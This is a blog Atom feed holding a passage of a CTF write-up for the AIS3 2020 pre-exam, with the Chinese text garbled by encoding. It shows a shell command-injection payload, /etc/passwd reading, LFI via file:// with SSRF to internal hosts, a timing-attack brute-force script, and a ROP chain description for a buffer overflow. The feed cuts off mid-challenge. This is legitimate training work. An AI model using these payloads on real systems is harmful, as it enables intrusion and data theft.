<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Star Note</title>
  
  <subtitle>æ˜Ÿç­†è¨˜</subtitle>
  <link href="https://twinklestar03.com/atom.xml" rel="self"/>
  
  <link href="https://twinklestar03.com/"/>
  <updated>2020-12-18T07:36:23.813Z</updated>
  <id>https://twinklestar03.com/</id>
  
  <author>
    <name>TwinkleStar03</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AIS3-2020 Pre-Exam Writeup</title>
    <link href="https://twinklestar03.com/Contest/CTF/AIS3_2020_Pre-Exam_Writeup/"/>
    <id>https://twinklestar03.com/Contest/CTF/AIS3_2020_Pre-Exam_Writeup/</id>
    <published>2020-06-19T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:23.813Z</updated>
    
    <content type="html"><![CDATA[<p>å¾æ¥è§¸CTFåˆ°ç¾åœ¨å·²ç¶“éäº†ä¸€å¹´ï¼Œåœ¨CTFçš„æŠ€è¡“ä¸Šçš„ç¢ºé€²æ­¥äº†ä¸å°‘ï¼Œä½†é‚„æœ‰å¾ˆé•·ä¸€æ®µè·¯è¦èµ°å‘¢!</p><p>çµæœPwnæ²’è§£æ‰å¹¾é¡Œï¼ŒèŠ±å¤§éƒ¨åˆ†æ™‚é–“åœ¨çœ‹webâ€¦äº‹å¾Œçœ‹äº†pwnçš„é¡Œç›®æ‰ç™¼ç¾è‡ªå·±è§£çš„æ‰â€¦æ—©çŸ¥é“å°±å…ˆæ‰“Pwnã„‰QAQ</p><a id="more"></a><p>é€™æ¬¡è§£æ‰çš„é¡Œç›®â€¦</p><ul><li><p>ğŸ§Misc</p><ul><li>ğŸ’¤Piquero</li><li>ğŸ¥Karuego</li><li>ğŸŒ±Soy</li><li>ğŸ‘‘Saburo</li></ul></li><li><p>â™»ï¸Reverse</p><ul><li>ğŸTsaiBro</li><li>ğŸ¹Fallen Beat</li></ul></li><li><p>ğŸ’¥ Pwn</p><ul><li>ğŸ‘» BOF</li></ul></li><li><p>ğŸ™Š Crypto</p><ul><li>ğŸ¦• Brontosaurus</li><li>ğŸ¦– T-Rex</li></ul></li><li><p>ğŸŒWeb</p><ul><li>ğŸ¿ï¸Squirrel</li><li>ğŸ¦ˆShark</li><li>ğŸ˜Elephant</li><li>ğŸSnake</li><li>ğŸ¦‰Owl</li></ul></li></ul><hr><h2 id="ğŸ§Misc"><a href="#ğŸ§Misc" class="headerlink" title="ğŸ§Misc"></a>ğŸ§Misc</h2><h3 id="ğŸ’¤Piquero"><a href="#ğŸ’¤Piquero" class="headerlink" title="ğŸ’¤Piquero"></a>ğŸ’¤Piquero</h3><p>ç›²äººé»å­—ï¼Œæ‰¾è¡¨æ‰¾äº†å¾ˆä¹…ï¼Œç„¶å¾Œä¸€å€‹ä¸€å€‹å­—æ…¢æ…¢å°â€¦</p><p>Flag: <code>AIS3&#123;I_feel_sleepy_Good_Night!!!&#125;</code></p><h3 id="ğŸ¥Karuego"><a href="#ğŸ¥Karuego" class="headerlink" title="ğŸ¥Karuego"></a>ğŸ¥Karuego</h3><p>æ‹¿åˆ°ä¸€å¼µåœ–ç‰‡:<br><img src="/images/AIS3_2020_Pre-Exam/Karuego.png" alt="Karuego.png"></p><p>æ„Ÿè¦ºåœ–ç‰‡è£¡é¢æœ‰æ”¾æ±è¥¿ï¼Œå…ˆæ‹¿å»binwalkâ€¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 2880 x 1492, 8-bit&#x2F;color RGBA, non-interlaced</span><br><span class="line">41            0x29            Zlib compressed data, compressed</span><br><span class="line">2059568       0x1F6D30        Zip archive data, at least v1.0 to extract, name: files&#x2F;</span><br><span class="line">2059632       0x1F6D70        Zip archive data, encrypted at least v2.0 to extract, compressed size: 113020, uncompressed size: 113110, name: files&#x2F;3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg</span><br><span class="line">2172779       0x21276B        Zip archive data, encrypted at least v2.0 to extract, compressed size: 1087747, uncompressed size: 1092860, name: files&#x2F;Demon.png</span><br><span class="line">3260899       0x31C1E3        End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>è£é ­çš„ç¢ºæœ‰æ±è¥¿ï¼Œ<code>binwalk -e</code> extractå‡ºä¾†ï¼Œä¹‹å¾Œçœ‹åˆ°ä¸€å€‹è¢«é–èµ·ä¾†çš„zipï¼Œä¸çŸ¥é“æ€éº¼æ‰¾å¯†ç¢¼å°±ç”¨fcrackzipæŠŠå¯†ç¢¼ç‚¸å‡ºä¾†ï¼Œä¹‹å¾Œå°±æ‹¿åˆ°å¸¶æœ‰flagçš„åœ–ç‰‡ã€‚</p><p><img src="/images/AIS3_2020_Pre-Exam/Demon.png" alt="Demon.png"></p><h3 id="ğŸŒ±Soy"><a href="#ğŸŒ±Soy" class="headerlink" title="ğŸŒ±Soy"></a>ğŸŒ±Soy</h3><p>æ‹¿åˆ°ä¸€å¼µå¤±å»ä¸€éƒ¨åˆ†çš„QRCode</p><p><img src="/images/AIS3_2020_Pre-Exam/Soy.png" alt="Soy.png"></p><p>æ‰¾äº†æ‰¾ç¶²è·¯è³‡æºæ‰¾åˆ°äº†é—œæ–¼QRCodeå¾©åŸçš„<a href="https://www.robertxiao.ca/hacking/ctf-writeup/mma2015-qrcode/">æ–‡ç« </a>ï¼Œé †è‘—æ–‡ç« ç ”ç©¶äº†QRCodeçš„é‹ä½œæ–¹å¼å¾Œï¼Œæˆ‘ç”¨QRazyBoxé€™å€‹å·¥å…·åœ¨ä¸Šé¢ä¸€å€‹ä¸€å€‹åƒç´ é»å‡ºä¾†ï¼Œä¹‹å¾Œè®“ä»–é…åˆerror Correctionä¾†æŠŠå®Œæ•´è³‡è¨Šextractå‡ºä¾†</p><p><img src="/images/AIS3_2020_Pre-Exam/QRazyBox.png" alt="QRazyBox">  </p><p>Flag: <code> AIS3&#123;H0w_c4n_y0u_f1nd_me?!?!?!!&#125;</code></p><h3 id="ğŸ‘‘Saburo"><a href="#ğŸ‘‘Saburo" class="headerlink" title="ğŸ‘‘Saburo"></a>ğŸ‘‘Saburo</h3><p>æ‹¿åˆ°ä¸€å€‹ä½ç½®ï¼Œncä¸Šå»ä¹‹å¾Œç¨å¾®æ‘¸ç´¢å¾Œç™¼ç¾: åªè¦é€å‡ºçš„å­—ä¸²è·ŸFlagéƒ¨åˆ†ç›¸åŒçš„è©±å°±æœƒå›å‚³æ›´å¤§çš„æ™‚é–“ï¼Œä½†æ˜¯é€™å€‹æ™‚é–“å‰å¾Œæœ‰é»èª¤å·®ï¼Œè€Œä¸”é•·åº¦è¶Šé•·å®ƒèª¤å·®è¶Šå¤§ï¼Œæ‰€ä»¥æˆ‘é¸æ“‡å¤šå‚³å¹¾æ¬¡ç„¶å¾Œå–å¹³å‡å€¼ä¾†æ±ºå®šé€™å€‹æ˜¯ä¸æ˜¯æ­£ç¢ºçš„å­—å…ƒã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Flag: A</span><br><span class="line">Haha, you lose in 26 milliseconds.</span><br><span class="line">---</span><br><span class="line">Flag: AI</span><br><span class="line">Haha, you lose in 37 milliseconds.</span><br><span class="line">---</span><br><span class="line">Flag: AIS</span><br><span class="line">Haha, you lose in 55 milliseconds.</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘å¯«äº†ä¸€å€‹Pythonè…³æœ¬ä¾†å¹«æˆ‘æ‹¼å‡ºFlag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag_it</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;AIS3&#123;&#x27;</span></span><br><span class="line">    pre_avg = <span class="number">75</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> char_set:</span><br><span class="line">            tmp_flag = flag + c</span><br><span class="line">            avg = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">                avg.append(send(tmp_flag))</span><br><span class="line">            avg = <span class="built_in">sum</span>(avg) / <span class="built_in">len</span>(avg)</span><br><span class="line">            print(<span class="string">&#x27;Now: &#123;&#125;, Now_Avg: &#123;&#125;, Pre_Avg: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(c, avg, pre_avg))</span><br><span class="line">            <span class="keyword">if</span> avg &gt; pre_avg:</span><br><span class="line">                pre_avg = avg + <span class="number">5</span></span><br><span class="line">                flag = tmp_flag</span><br><span class="line">                print(<span class="string">&#x27;Found one char! Flag:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Flag: <code>AIS3&#123;A1r1ght_U_4r3_my_3n3nnies&#125;</code></p><hr><h2 id="â™»ï¸Reverse"><a href="#â™»ï¸Reverse" class="headerlink" title="â™»ï¸Reverse"></a>â™»ï¸Reverse</h2><h3 id="ğŸTsaiBro"><a href="#ğŸTsaiBro" class="headerlink" title="ğŸTsaiBro"></a>ğŸTsaiBro</h3><p>ä¸€é–‹å§‹æ‹¿åˆ°ä¸€å€‹binaryè·Ÿä¸€å€‹txtï¼Œbinaryæœƒæ ¹æ“šåƒæ•¸ä¾†å°å‡ºå°æ‡‰çš„å¯†æ–‡<br>å› ç‚ºæ‡¶æƒ°æ‰€ä»¥æ²’æœ‰å»é€†å‘é‚£å€‹binaryï¼Œåè€Œç›´æ¥è“‹ä¸€å€‹å°ç…§è¡¨èµ·ä¾†ï¼Œæœ€å¾Œå¯«å€‹è…³æœ¬æŠŠFlagæ‰¾å‡ºä¾†â€¦</p><p>Flag: <code>AIS3&#123;y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3&#125;</code></p><h3 id="ğŸ¹Fallen-Beat"><a href="#ğŸ¹Fallen-Beat" class="headerlink" title="ğŸ¹Fallen Beat"></a>ğŸ¹Fallen Beat</h3><p>æ‹¿åˆ°ä¸€å€‹Jaråšçš„éŸ³Gï¼ŒéŸ³æ¨‚å‹•äºº(?</p><p>æ‹¿å»é¤µçµ¦jd-guiå»é€†å‘ä¾†çœ‹çœ‹flagçš„é‚è¼¯ï¼Œç„¶å¾Œåœ¨<code>PanelEnding.class</code>è£é ­æ‰¾åˆ°Flagçš„é™£åˆ—ã€‚<br>ç¹¼çºŒå¾€ä¸‹æ‰¾å¯ä»¥æ‰¾åˆ°è§£å¯†Flagçš„é‚è¼¯ï¼Œæœ€å¾Œæ‰¾åˆ°cacheä¾†å°é€™å€‹é™£åˆ—åšXORå°±å¯ä»¥æ‰¾å‡ºFlagäº†!<br>Cacheæ˜¯<code>songs/gekkou/hell</code>é€™å€‹çœ‹èµ·ä¾†åƒæ˜¯è­œé¢çš„æ±è¥¿ï¼Œå¯¦éš›ä¸Šè£é ­è£è‘—Cacheæœƒè¼‰å…¥çš„æ±è¥¿ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] flag = <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; </span><br><span class="line">      <span class="number">89</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">43</span>, <span class="number">126</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">109</span>, <span class="number">68</span>, <span class="number">109</span>, </span><br><span class="line">      <span class="number">109</span>, <span class="number">97</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">45</span>, <span class="number">113</span>, <span class="number">102</span>, <span class="number">64</span>, <span class="number">121</span>, <span class="number">47</span>, </span><br><span class="line">      <span class="number">111</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">68</span>, <span class="number">105</span>, Byte.MAX_VALUE, <span class="number">124</span>, </span><br><span class="line">      <span class="number">94</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">107</span>, <span class="number">97</span>, <span class="number">104</span> &#125;;</span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> (t == mc) &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache.size(); i++)</span><br><span class="line">        <span class="keyword">this</span>.flag[i % <span class="keyword">this</span>.flag.length] = (<span class="keyword">byte</span>)(<span class="keyword">this</span>.flag[i % <span class="keyword">this</span>.flag.length] ^ ((Integer)cache.get(i)).intValue()); </span><br><span class="line">      String fff = <span class="keyword">new</span> String(<span class="keyword">this</span>.flag);</span><br><span class="line">      <span class="keyword">this</span>.text[<span class="number">0</span>].setText(String.format(<span class="string">&quot;Flag: %s&quot;</span>, <span class="keyword">new</span> Object[] &#123; fff &#125;));</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>å¯«å€‹è…³æœ¬æŠŠFlag XORå›ä¾†ã€‚</p><p>Flag: <code>AIS3&#123;Wow_how_m4ny_h4nds_do_you_h4ve&#125;</code></p><hr><h2 id="ğŸ’¥-Pwn"><a href="#ğŸ’¥-Pwn" class="headerlink" title="ğŸ’¥ Pwn"></a>ğŸ’¥ Pwn</h2><h3 id="ğŸ‘»-BOF"><a href="#ğŸ‘»-BOF" class="headerlink" title="ğŸ‘» BOF"></a>ğŸ‘» BOF</h3><p>æœ‰BufferOverflowçš„æ´ã€‚</p><p>æ²’æœ‰åœ¨binaryä¸­æ‰¾åˆ°å¯ä»¥ç›´æ¥é–‹shellçš„å‡½æ•¸ï¼Œä½†æ˜¯æœ‰<code>system@plt</code>å¯ä»¥ç”¨ã€‚<br>åœ¨64bitä¸‹é€éregisterå‚³åƒæ•¸ï¼Œæ‰€ä»¥æ‰¾å€‹å¯ä»¥<code>pop rdi; ret</code>çš„gadgetä¾†ç”¨å°±å¯ä»¥æ§åˆ¶systemçš„ç¬¬ä¸€å€‹åƒæ•¸äº†ã€‚</p><p>ç¬¬ä¸€å€‹åƒæ•¸è¦æ±‚çš„å‹æ…‹æ˜¯<code>char[]</code>ï¼Œç›´æ¥å¡«<code>&quot;/bin/sh&quot;</code>æ˜¯æ²’è¾¦æ³•getshellçš„ï¼Œåœ¨binaryä¸­æœ‰æ‰¾åˆ°ä¸€å€‹å¯ä»¥å¯«çš„.bsså€åŸŸï¼Œé…åˆ<code>gets@plt</code>å°±å¯åœ¨é‚£å€‹ä½ç½®å¯«<code>&quot;/bin/sh&quot;</code>ï¼Œæœ€å¾ŒæŠŠè©²ä½ç½®ç•¶åƒæ•¸å‚³çµ¦<code>system</code>å°±å¯ä»¥getshelläº†ã€‚</p><hr><h2 id="ğŸ™Š-Crypto"><a href="#ğŸ™Š-Crypto" class="headerlink" title="ğŸ™Š Crypto"></a>ğŸ™Š Crypto</h2><h3 id="ğŸ¦•-Brontosaurus"><a href="#ğŸ¦•-Brontosaurus" class="headerlink" title="ğŸ¦• Brontosaurus"></a>ğŸ¦• Brontosaurus</h3><p>æ©â€¦JSFuckï¼Œå€’è½‰ç„¶å¾Œæ‹¿å»consoleè·‘</p><p>Flag: ``</p><h3 id="ğŸ¦–-T-Rex"><a href="#ğŸ¦–-T-Rex" class="headerlink" title="ğŸ¦– T-Rex"></a>ğŸ¦– T-Rex</h3><p>çµ¦äº†å°ç…§è¡¨ï¼Œç›´æ¥Find+ReplaceæŠŠflagé‚„åŸå‡ºä¾†ã€‚</p><p>Flag: <code>AIS3&#123;TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX&#125;</code></p><hr><h2 id="ğŸŒWeb"><a href="#ğŸŒWeb" class="headerlink" title="ğŸŒWeb"></a>ğŸŒWeb</h2><h3 id="ğŸ¿ï¸Squirrel"><a href="#ğŸ¿ï¸Squirrel" class="headerlink" title="ğŸ¿ï¸Squirrel"></a>ğŸ¿ï¸Squirrel</h3><p>é€²åˆ°<code>https://squirrel.ais3.org/</code>çœ‹åˆ°ä¸€å †æ¾é¼ ï¼Œç¿»äº†ç¿»ç¶²é æ‰¾åˆ°äº†é€™æ®µJavascript:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">const</span> squirrelFile = <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    fetch(<span class="string">&#x27;api.php?get=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(squirrelFile))</span><br><span class="line">      .then(<span class="function"><span class="params">res</span> =&gt;</span> res.json())</span><br><span class="line">      .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;error&#x27;</span> <span class="keyword">in</span> data) &#123;</span><br><span class="line">          <span class="keyword">throw</span> data.error;</span><br><span class="line">        &#125;</span><br><span class="line">        data.output.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">          .map(<span class="function"><span class="params">line</span> =&gt;</span> line.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>].trim())</span><br><span class="line">          .filter(<span class="function"><span class="params">name</span> =&gt;</span> name.length)</span><br><span class="line">          .forEach(<span class="function"><span class="params">name</span> =&gt;</span> <span class="keyword">new</span> Squirrel(name).update());</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">        alert(<span class="string">&#x27;Something went wrong! Please report this to the author!&#x27;</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†ä¸€å€‹æœƒåˆ—å‡ºæª”æ¡ˆçš„ç¶²é : <code>https://squirrel.ais3.org/api.php</code>ç„¶å¾Œç”¨<code>?get</code>ä¾†å‚³è¦åˆ—å‡ºçš„æª”æ¡ˆï¼Œæ„Ÿè¦ºå¯ä»¥åšåˆ°arbritrary file readï¼Œæ‰€ä»¥å°±å…ˆçœ‹çœ‹èƒ½ä¸èƒ½åˆ—å‡º<code>api.php</code>å®ƒè‡ªå·±ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($file = @$_GET[<span class="string">&#x27;get&#x27;</span>]) &#123;</span><br><span class="line">    $output = shell_exec(<span class="string">&quot;cat &#x27;$file&#x27;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($output !== <span class="literal">null</span>) &#123;</span><br><span class="line">        echo json_encode([</span><br><span class="line">            <span class="string">&#x27;output&#x27;</span> =&gt; $output</span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo json_encode([</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;cannot get file&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo json_encode([</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;empty file path&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ´©æ¼å®ŒåŸç¢¼å¾Œç™¼ç¾æœ‰command injectionçš„æ´ï¼Œæ‰€ä»¥å°±æ§‹é€ äº†<code>?get=&#39;; ls /&#39;</code>å…ˆå°rootåšlsï¼Œå¾—åˆ°ä»¥ä¸‹å…§å®¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure><p>é‚£å€‹<code>5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</code>çœ‹èµ·ä¾†åƒFlagï¼Œæ‰€ä»¥å°±é€<code>?get=/5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</code>è®€çœ‹çœ‹ï¼Œå°±æ‹¿åˆ°Flagäº†ã€‚</p><p>Flag: <code>AIS3&#123;5qu1rr3l_15_4_k1nd_0f_b16_r47&#125;</code></p><h3 id="ğŸ¦ˆShark"><a href="#ğŸ¦ˆShark" class="headerlink" title="ğŸ¦ˆShark"></a>ğŸ¦ˆShark</h3><p>é€²åˆ°ç¶²é å¾Œçœ‹åˆ°æœ‰å€‹Hintå¯ä»¥é»ï¼ŒHintèªªFlagåœ¨æŸå€‹å…§éƒ¨ä¼ºæœå™¨ï¼Œé †ä¾¿ç™¼ç¾Hintæ˜¯ç”¨<code>?path=</code>è®€å‡ºä¾†çš„ï¼Œæ„Ÿè¦ºæœ‰LFIçš„æ¼æ´å¯ä»¥ç”¨â€¦<br>æ‰€ä»¥å°±ç›´æ¥è¼¸å…¥<code>?path=index.php</code>çœ‹çœ‹èƒ½ä¸èƒ½çœ‹åˆ°åŸå§‹ç¢¼ã€‚</p><p>æˆåŠŸæ´©æ¼åŸç¢¼å¾Œçœ‹åˆ°é€™æ®µï¼Œéæ¿¾äº†ä¸€äº›ç¬¦è™Ÿï¼Œä½†é‚„æ˜¯å¯ä»¥ç”¨<code>file://</code>é€²è¡Œç¹éä¾†ä»»æ„è®€æª”ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$path</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^(\.|\/)/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="comment">// disallow /path/like/this and ../this</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;[forbidden]&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$content</span> = @file_get_contents(<span class="variable">$path</span>, <span class="literal">FALSE</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . (<span class="variable">$content</span> ? htmlentities(<span class="variable">$content</span>) : <span class="string">&#x27;[empty]&#x27;</span>) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å› ç‚ºèªªFlagé‹è¡Œåœ¨å…§éƒ¨çš„ä¼ºæœå™¨å…§ï¼Œæ‰€ä»¥æˆ‘æ§‹é€ <code>?path=file:///proc/self/net/fib_trie</code>å»è®€äº†ç¶²è·¯æ¨¹ç‹€åœ–(?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Main:</span><br><span class="line">  +-- 0.0.0.0&#x2F;0 3 0 5</span><br><span class="line">     |-- 0.0.0.0</span><br><span class="line">        &#x2F;0 universe UNICAST</span><br><span class="line">     +-- 127.0.0.0&#x2F;8 2 0 2</span><br><span class="line">        +-- 127.0.0.0&#x2F;31 1 0 0</span><br><span class="line">           |-- 127.0.0.0</span><br><span class="line">              &#x2F;32 link BROADCAST</span><br><span class="line">              &#x2F;8 host LOCAL</span><br><span class="line">           |-- 127.0.0.1</span><br><span class="line">              &#x2F;32 host LOCAL</span><br><span class="line">        |-- 127.255.255.255</span><br><span class="line">           &#x2F;32 link BROADCAST</span><br><span class="line">     +-- 172.22.0.0&#x2F;16 2 0 2</span><br><span class="line">        +-- 172.22.0.0&#x2F;30 2 0 2</span><br><span class="line">           |-- 172.22.0.0</span><br><span class="line">              &#x2F;32 link BROADCAST</span><br><span class="line">              &#x2F;16 link UNICAST</span><br><span class="line">           |-- 172.22.0.3</span><br><span class="line">              &#x2F;32 host LOCAL</span><br><span class="line">        |-- 172.22.255.255</span><br><span class="line">           &#x2F;32 link BROADCAST</span><br></pre></td></tr></table></figure><p>çœ‹äº†ä¸‹IPï¼Œå°±å¾127.22.0.0é–‹å§‹æ‰¾ï¼Œç„¶å¾Œç”¨<code>?path=http://172.22.0.1/flag</code>ä¾†è®€ï¼Œæ²’å¤šä¹…å°±åœ¨127.22.0.2æ‰¾åˆ°Flagã€‚</p><p>Flag: <code>AIS3&#123;5h4rk5_d0n&#39;7_5w1m_b4ckw4rd5&#125;</code></p><h3 id="ğŸ˜Elephant"><a href="#ğŸ˜Elephant" class="headerlink" title="ğŸ˜Elephant"></a>ğŸ˜Elephant</h3><p>ç¶²é æœ‰å€‹å¯ä»¥è¼¸å…¥nameçš„åœ°æ–¹ï¼Œå…ˆéš¨ä¾¿æ‰“ä¸€äº›æ±è¥¿ä¹‹å¾Œç™»å…¥ï¼Œç„¶å¾Œå°±åœ¨ç¶²é å…§æ‰¾åˆ°ä¸€å€‹æç¤º<code>You may want to read the source 